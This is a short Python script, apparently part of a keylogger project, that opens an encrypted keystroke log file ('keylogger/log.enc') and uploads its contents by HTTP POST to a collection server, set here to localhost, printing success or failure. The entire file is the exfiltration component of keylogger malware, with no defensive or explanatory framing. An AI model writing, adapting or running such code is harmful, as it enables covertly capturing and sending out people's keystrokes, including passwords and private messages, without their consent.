import requests
import os

FILE_PATH = "keylogger/log.enc"
SERVER_URL = "http://localhost:5000/upload"

def send_encrypted_log():
    if not os.path.exists(FILE_PATH):
        print("[!] log.enc not found.")
        return
    with open(FILE_PATH, "rb") as f:
        response = requests.post(SERVER_URL, data=f.read())
    if response.status_code == 200:
        print("[+] Encrypted log sent.")
    else:
        print(f"[!] Failed with status: {response.status_code}")

if __name__ == "__main__":
    send_encrypted_log()